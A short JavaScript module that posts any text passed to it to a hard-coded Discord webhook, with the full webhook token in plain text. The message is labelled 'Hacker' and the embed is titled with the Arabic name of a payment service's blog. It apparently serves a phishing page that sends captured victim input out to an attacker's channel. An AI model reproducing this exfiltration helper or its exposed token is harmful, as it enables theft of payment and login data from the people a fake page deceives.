import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1321808952177987614/-JqaAZgtVQ7u9p9oAf2p_AdmAHUB-s5jwvP8-jRjLbK1u6zI8XiHQrB6w41B6AI4JChQ",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
